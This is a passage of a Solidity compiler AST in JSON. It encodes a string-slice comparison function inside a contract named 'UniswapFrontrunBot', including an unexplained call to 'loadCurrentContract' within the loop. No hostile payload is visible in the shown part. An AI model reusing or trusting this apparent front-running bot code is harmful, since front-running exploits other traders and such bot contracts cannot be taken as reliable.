																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 103,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 328,
																	"src": "1774:19:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 105,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1774:43:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 106,
															"nodeType": "ExpressionStatement",
															"src": "1774:43:0"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1841:91:0",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1860:19:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1871:7:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1865:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1865:14:0"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1860:1:0"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1897:20:0",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1908:8:0"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1902:5:0"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1902:15:0"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1897:1:0"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 86,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1860:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 89,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1897:1:0",
																	"valueSize": 1
																},
																{
																	"declaration": 70,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1908:8:0",
																	"valueSize": 1
																},
																{
																	"declaration": 65,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1871:7:0",
																	"valueSize": 1
																}
															],
															"id": 107,
															"nodeType": "InlineAssembly",
															"src": "1832:100:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 110,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 108,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 86,
																	"src": "1953:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 109,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 89,
																	"src": "1958:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1953:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 164,
															"nodeType": "IfStatement",
															"src": "1949:411:0",
															"trueBody": {
																"id": 163,
																"nodeType": "Block",
																"src": "1961:399:0",
																"statements": [
																	{
																		"assignments": [
																			112
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 112,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 163,
																				"src": "2064:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 111,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2064:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 118,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 116,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "-",
																					"prefix": true,
																					"src": "2087:2:0",
																					"subExpression": {
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 115,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "2088:1:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_1_by_1",
																							"typeString": "int_const 1"
																						},
																						"value": "1"
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				],
																				"id": 114,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "2079:7:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint256_$",
																					"typeString": "type(uint256)"
																				},
																				"typeName": {
																					"id": 113,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2079:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 117,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "2079:11:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2064:26:0"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 121,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 119,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 49,
																				"src": "2115:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3332",
																				"id": 120,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2126:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_32_by_1",
																					"typeString": "int_const 32"
																				},
																				"value": "32"
																			},
																			"src": "2115:13:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 141,
																		"nodeType": "IfStatement",
																		"src": "2112:105:0",
																		"trueBody": {
																			"id": 140,
																			"nodeType": "Block",
																			"src": "2130:87:0",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 138,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 122,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 112,
																							"src": "2151:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"id": 137,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "2158:39:0",
																							"subExpression": {
																								"argumentTypes": null,
																								"components": [
																									{
																										"argumentTypes": null,
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 135,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"argumentTypes": null,
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 133,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"argumentTypes": null,
																												"hexValue": "32",
																												"id": 123,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "2160:1:0",
																												"subdenomination": null,
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"argumentTypes": null,
																												"components": [
																													{
																														"argumentTypes": null,
																														"commonType": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														},
																														"id": 131,
																														"isConstant": false,
																														"isLValue": false,
																														"isPure": false,
																														"lValueRequested": false,
																														"leftExpression": {
																															"argumentTypes": null,
																															"hexValue": "38",
																															"id": 124,
																															"isConstant": false,
																															"isLValue": false,
																															"isPure": true,
																															"kind": "number",
																															"lValueRequested": false,
																															"nodeType": "Literal",
																															"src": "2166:1:0",
																															"subdenomination": null,
																															"typeDescriptions": {
																																"typeIdentifier": "t_rational_8_by_1",
																																"typeString": "int_const 8"
																															},
																															"value": "8"
																														},
																														"nodeType": "BinaryOperation",
																														"operator": "*",
																														"rightExpression": {
																															"argumentTypes": null,
																															"components": [
																																{
																																	"argumentTypes": null,
																																	"commonType": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	},
																																	"id": 129,
																																	"isConstant": false,
																																	"isLValue": false,
																																	"isPure": false,
																																	"lValueRequested": false,
																																	"leftExpression": {
																																		"argumentTypes": null,
																																		"commonType": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		},
																																		"id": 127,
																																		"isConstant": false,
																																		"isLValue": false,
																																		"isPure": false,
																																		"lValueRequested": false,
																																		"leftExpression": {
																																			"argumentTypes": null,
																																			"hexValue": "3332",
																																			"id": 125,
																																			"isConstant": false,
																																			"isLValue": false,
																																			"isPure": true,
																																			"kind": "number",
																																			"lValueRequested": false,
																																			"nodeType": "Literal",
																																			"src": "2171:2:0",
																																			"subdenomination": null,
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_rational_32_by_1",
																																				"typeString": "int_const 32"
																																			},
																																			"value": "32"
																																		},
																																		"nodeType": "BinaryOperation",
																																		"operator": "-",
																																		"rightExpression": {
																																			"argumentTypes": null,
																																			"id": 126,
																																			"name": "shortest",
																																			"nodeType": "Identifier",
																																			"overloadedDeclarations": [],
																																			"referencedDeclaration": 49,
																																			"src": "2176:8:0",
																																			"typeDescriptions": {
																																				"typeIdentifier": "t_uint256",
																																				"typeString": "uint256"
																																			}
																																		},
																																		"src": "2171:13:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"nodeType": "BinaryOperation",
																																	"operator": "+",
																																	"rightExpression": {
																																		"argumentTypes": null,
																																		"id": 128,
																																		"name": "idx",
																																		"nodeType": "Identifier",
																																		"overloadedDeclarations": [],
																																		"referencedDeclaration": 75,
																																		"src": "2187:3:0",
																																		"typeDescriptions": {
																																			"typeIdentifier": "t_uint256",
																																			"typeString": "uint256"
																																		}
																																	},
																																	"src": "2171:19:0",
																																	"typeDescriptions": {
																																		"typeIdentifier": "t_uint256",
																																		"typeString": "uint256"
																																	}
																																}
																															],
																															"id": 130,
																															"isConstant": false,
																															"isInlineArray": false,
																															"isLValue": false,
																															"isPure": false,
																															"lValueRequested": false,
																															"nodeType": "TupleExpression",
																															"src": "2170:21:0",
																															"typeDescriptions": {
																																"typeIdentifier": "t_uint256",
																																"typeString": "uint256"
																															}
																														},
																														"src": "2166:25:0",
																														"typeDescriptions": {
																															"typeIdentifier": "t_uint256",
																															"typeString": "uint256"
																														}
																													}
																												],
																												"id": 132,
																												"isConstant": false,
																												"isInlineArray": false,
																												"isLValue": false,
																												"isPure": false,
																												"lValueRequested": false,
																												"nodeType": "TupleExpression",
																												"src": "2165:27:0",
																												"typeDescriptions": {
																													"typeIdentifier": "t_uint256",
																													"typeString": "uint256"
																												}
																											},
																											"src": "2160:32:0",
																											"typeDescriptions": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											}
																										},
																										"nodeType": "BinaryOperation",
																										"operator": "-",
																										"rightExpression": {
																											"argumentTypes": null,
																											"hexValue": "31",
																											"id": 134,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": true,
																											"kind": "number",
																											"lValueRequested": false,
																											"nodeType": "Literal",
																											"src": "2195:1:0",
																											"subdenomination": null,
																											"typeDescriptions": {
																												"typeIdentifier": "t_rational_1_by_1",
																												"typeString": "int_const 1"
																											},
																											"value": "1"
																										},
																										"src": "2160:36:0",
																										"typeDescriptions": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										}
																									}
																								],
																								"id": 136,
																								"isConstant": false,
																								"isInlineArray": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"nodeType": "TupleExpression",
																								"src": "2159:38:0",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2151:46:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"id": 139,
																					"nodeType": "ExpressionStatement",
																					"src": "2151:46:0"
																				}
																			]
																		}
																	},
																	{
																		"assignments": [
																			143
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 143,
																				"mutability": "mutable",
																				"name": "diff",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 163,
																				"src": "2235:12:0",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 142,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "2235:7:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 153,
																		"initialValue": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 152,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 146,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 144,
																							"name": "a",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 86,
																							"src": "2251:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 145,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 112,
																							"src": "2255:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2251:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 147,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2250:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 150,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 148,
																							"name": "b",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 89,
																							"src": "2264:1:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "&",
																						"rightExpression": {
																							"argumentTypes": null,
																							"id": 149,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 112,
																							"src": "2268:4:0",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"src": "2264:8:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"id": 151,
																				"isConstant": false,
																				"isInlineArray": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"nodeType": "TupleExpression",
																				"src": "2263:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "2250:23:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "2235:38:0"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 156,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 154,
																				"name": "diff",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 143,
																				"src": "2296:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "!=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "30",
																				"id": 155,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "2304:1:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_0_by_1",
																					"typeString": "int_const 0"
																				},
																				"value": "0"
																			},
																			"src": "2296:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 162,
																		"nodeType": "IfStatement",
																		"src": "2292:52:0",
																		"trueBody": {
																			"expression": {
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 159,
																						"name": "diff",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 143,
																						"src": "2339:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					],
																					"id": 158,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "2335:3:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_int256_$",
																						"typeString": "type(int256)"
																					},
																					"typeName": {
																						"id": 157,
																						"name": "int",
																						"nodeType": "ElementaryTypeName",
																						"src": "2335:3:0",
																						"typeDescriptions": {
																							"typeIdentifier": null,
																							"typeString": null
																						}
																					}
																				},
																				"id": 160,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "2335:9:0",
																				"tryCall": false,
																				"typeDescriptions": {
																					"typeIdentifier": "t_int256",
																					"typeString": "int256"
																				}
																			},
																			"functionReturnParameters": 47,
																			"id": 161,
																			"nodeType": "Return",
																			"src": "2328:16:0"
																		}
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 167,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 165,
																	"name": "selfptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 65,
																	"src": "2374:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 166,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2385:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2374:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 168,
															"nodeType": "ExpressionStatement",
															"src": "2374:13:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 171,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 169,
																	"name": "otherptr",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 70,
																	"src": "2402:8:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "+=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3332",
																	"id": 170,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "2414:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_32_by_1",
																		"typeString": "int_const 32"
																	},
																	"value": "32"
																},
																"src": "2402:14:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 172,
															"nodeType": "ExpressionStatement",
															"src": "2402:14:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 80,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 78,
														"name": "idx",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 75,
														"src": "1394:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 79,
														"name": "shortest",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 49,
														"src": "1400:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1394:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 174,
												"initializationExpression": {
													"assignments": [
														75
													],
													"declarations": [
														{
															"constant": false,
															"id": 75,
															"mutability": "mutable",
															"name": "idx",
															"nodeType": "VariableDeclaration",
															"overrides": null,
															"scope": 174,
															"src": "1380:8:0",
															"stateVariable": false,
															"storageLocation": "default",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"typeName": {
																"id": 74,
																"name": "uint",
																"nodeType": "ElementaryTypeName",
																"src": "1380:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"value": null,
															"visibility": "internal"
														}
													],
													"id": 77,
													"initialValue": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 76,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1391:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"nodeType": "VariableDeclarationStatement",
													"src": "1380:12:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 83,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 81,
															"name": "idx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 75,
															"src": "1410:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "+=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "3332",
															"id": 82,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1417:2:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_32_by_1",
																"typeString": "int_const 32"
															},
															"value": "32"
														},
														"src": "1410:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 84,
													"nodeType": "ExpressionStatement",
													"src": "1410:9:0"
												},
												"nodeType": "ForStatement",
												"src": "1375:1053:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													},
													"id": 185,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 177,
																	"name": "self",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 41,
																	"src": "2449:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																		"typeString": "struct UniswapFrontrunBot.slice memory"
																	}
																},
																"id": 178,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 36,
																"src": "2449:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"id": 176,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "2445:3:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_int256_$",
																"typeString": "type(int256)"
															},
															"typeName": {
																"id": 175,
																"name": "int",
																"nodeType": "ElementaryTypeName",
																"src": "2445:3:0",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 179,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2445:14:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_int256",
															"typeString": "int256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 182,
																	"name": "other",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 43,
																	"src": "2466:5:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_struct$_slice_$39_memory_ptr",
																		"typeString": "struct UniswapFrontrunBot.slice memory"
																	}
																},
																"id": 183,
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "_len",
																"nodeType": "MemberAccess",
																"referencedDeclaration": 36,
																"src": "2466:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
